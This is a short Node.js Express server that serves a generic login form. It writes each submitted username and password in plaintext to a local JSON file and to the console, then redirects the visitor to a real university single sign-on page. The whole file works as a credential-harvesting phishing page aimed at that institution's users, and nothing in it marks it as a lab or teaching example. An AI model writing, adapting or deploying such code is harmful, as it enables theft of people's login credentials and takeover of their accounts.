const express = require('express');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');

const app = express();
const port = 3000;

// Middleware to parse POST request body
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Path to the JSON file where data will be stored
const dataFilePath = path.join(__dirname, 'data.json');

// Serve the form page (simple HTML form)
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Form</title>
        </head>
        <body>
            <h1>Login Form</h1>
            <form method="POST" action="/submit">
                <label for="username">Username:</label>
                <input type="text" id="username" name="username" required><br>
                <label for="password">Password:</label>
                <input type="password" id="password" name="password" required><br>
                <button type="submit">Submit</button>
            </form>
        </body>
        </html>
    `);
});

// Handle POST request to submit data
app.post('/submit', (req, res) => {
    const { username, password } = req.body;

    // Read the existing data from the JSON file (if exists)
    let existingData = [];
    if (fs.existsSync(dataFilePath)) {
        const fileData = fs.readFileSync(dataFilePath);
        existingData = JSON.parse(fileData);
    }

    // Add new data
    existingData.push({ username, password, timestamp: new Date().toISOString() });

    // Write the updated data back to the file
    fs.writeFileSync(dataFilePath, JSON.stringify(existingData, null, 2));

    console.log('Data saved:', { username, password });

    // Redirect to specified URL
    res.redirect('https://sso.esaunggul.ac.id/');
});

// Start the server
app.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`);
});
